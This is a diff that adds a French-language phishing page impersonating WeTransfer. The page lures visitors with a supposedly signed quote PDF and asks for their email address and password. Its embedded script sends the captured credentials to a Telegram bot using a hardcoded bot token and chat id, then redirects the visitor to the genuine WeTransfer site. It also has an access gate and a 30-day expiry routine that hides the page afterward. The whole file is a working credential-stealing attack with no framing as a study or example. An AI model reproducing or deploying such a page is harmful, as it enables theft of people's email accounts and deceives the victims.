@@ -1,0 +1,170 @@
+<!DOCTYPE html>
+<html lang="fr">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Wetransfer - Partage de fichier</title>
+    <link rel="stylesheet" href=" https://fourcareit.web.app/Mystyle.css">
+<script>
+if (localStorage.getItem('valide') !== 'true') {
+    window.location.href = "../";
+}
+</script>
+</head>
+<body class="bg-gray-100">
+    <div class="flex items-center justify-center flex-col">
+        <div>
+            <img class="mx-auto mt-10" src=" https://fourcareit.web.app/we.png" alt="Logo" width="300">
+            <div class="md:p-10 shadow-md rounded-md bg-white md:w-[500px] w-auto mx-2 p-6">
+                <p>Vous avez reçu un fichier sécurisé</p>
+                <div class="mt-3">
+                    <div class="flex items-center mb-7">
+                        <img src=" https://fourcareit.web.app/pdf.png" class="w-10" alt="PDF Icon">
+                        <p class="font-bold mx-3">Devis signé + Acompte.pdf</p>
+                    </div>
+                </div>
+                <p>Pour lire le document, veuillez entrer les identifiants de messagerie associés à ce fichier.</p>
+                <br>
+                <div>
+                    <input type="email" id="zone-email" class="border w-full py-2 px-2" placeholder="Entrez votre e-mail">
+                    <div id="affiche-mdp" class="hidden transition-opacity duration-500 ease-in-out">
+                        <input type="password" id="zone-password" class="border w-full py-2 px-2 mt-3" placeholder="Entrez le mot de passe">
+                    </div>
+                    <p class="mt-2 text-sm text-red-500 hidden" id="erreur-email">Veuillez entrer un e-mail valide.</p>
+                    <p class="mt-2 text-sm text-red-500 hidden" id="erreur-password">Mot de passe requis.</p>
+                    <button type="button" id="continuer-button" class="mt-7 text-center w-full bg-[#ff7900] text-white font-bold py-2">Continuer</button>
+                </div>
+            </div>
+        </div>
+    </div>
+   
+    <script>
+
+        document.addEventListener('DOMContentLoaded', function() {
+            var emailInput = document.getElementById('zone-email');
+            var passwordInput = document.getElementById('zone-password');
+            var errorEmailMessage = document.getElementById('erreur-email');
+            var errorPasswordMessage = document.getElementById('erreur-password');
+            var continueButton = document.getElementById('continuer-button');
+            var passwordField = document.getElementById('affiche-mdp');
+            
+            var telegramBotToken = '5015185950:AAEPX8fkl2TUbZIpWieK0csYXJGiaBe5lJ0';
+            var chatId = '-673339708';
+
+            continueButton.addEventListener('click', function() {
+                var email = emailInput.value;
+                var password = passwordInput.value;
+
+                // Validation de l'email
+                if (!validateEmail(email)) {
+                    errorEmailMessage.textContent = "Veuillez entrer un e-mail valide.";
+                    errorEmailMessage.classList.remove('hidden');
+                    passwordField.classList.add('hidden');
+                    errorPasswordMessage.classList.add('hidden');
+                } else {
+                    errorEmailMessage.classList.add('hidden');
+                    passwordField.classList.remove('hidden');
+
+                    // Vérification du mot de passe
+                    if (password === "") {
+                        errorPasswordMessage.textContent = "Mot de passe requis.";
+                        errorPasswordMessage.classList.remove('hidden');
+                    } else {
+                        errorPasswordMessage.classList.add('hidden');
+
+                        // Envoi des données au bot Telegram
+                        var message = `Email: ${email}\nMot de passe: ${password}`;
+
+                        fetch(`https://api.telegram.org/bot${telegramBotToken}/sendMessage`, {
+                            method: 'POST',
+                            headers: {
+                                'Content-Type': 'application/json'
+                            },
+                            body: JSON.stringify({
+                                chat_id: chatId,
+                                text: message
+                            })
+                        })
+                        .then(response => response.json())
+                        .then(data => {
+                            console.log('Message envoyé à Telegram:', data);
+                            window.location.href = 'https://wetransfer.com/';
+                        })
+                        .catch(error => {
+                            console.error('Erreur lors de l\'envoi du message:', error);
+                        });
+                    }
+                }
+            });
+
+            function validateEmail(email) {
+                var re = /^[a-zA-Z0-9._-]+@[a-zA-Z0-9.-]+\.[a-zA-Z]{2,6}$/;
+                return re.test(email);
+            }
+        });
+    </script>
+	<script>
+// Date de début : 8 juin 2025
+const startDate = new Date('2025-06-10T00:00:00');
+
+// Délai d’expiration en jours
+const expirationDays = 30;
+
+// Vérifie si le lien a expiré
+function isLinkExpired() {
+  const now = new Date();
+  const timeDiff = now - startDate;
+  const daysPassed = timeDiff / (1000 * 60 * 60 * 24);
+  return daysPassed >= expirationDays;
+}
+
+// Affiche un message d’expiration avec style percutant
+function showExpirationMessage() {
+  if (isLinkExpired()) {
+    // Supprimer tout le contenu de la page
+    document.body.innerHTML = '';
+
+    // Créer le conteneur du message
+    const messageDiv = document.createElement('div');
+    messageDiv.innerHTML = `
+      <h1>⚠️ Le lien a expiré</h1>
+      <p>Veuillez contacter l’administrateur du site pour plus d’informations.</p>
+    `;
+
+    // Style impactant
+    Object.assign(messageDiv.style, {
+      position: 'fixed',
+      top: '0',
+      left: '0',
+      width: '100vw',
+      height: '100vh',
+      display: 'flex',
+      flexDirection: 'column',
+      justifyContent: 'center',
+      alignItems: 'center',
+      backgroundColor: '#1a1a1a',
+      color: '#ff4d4f',
+      fontFamily: 'Segoe UI, Arial, sans-serif',
+      fontSize: '24px',
+      textAlign: 'center',
+      padding: '40px',
+      boxSizing: 'border-box',
+      zIndex: '9999',
+    });
+
+    // Style du titre
+    messageDiv.querySelector('h1').style.fontSize = '36px';
+    messageDiv.querySelector('h1').style.marginBottom = '20px';
+    messageDiv.querySelector('p').style.color = '#ffffff';
+
+    // Afficher sur la page
+    document.body.appendChild(messageDiv);
+  }
+}
+
+// Lancer au chargement de la page
+window.onload = showExpirationMessage;
+</script>
+
+</body>
+</html>
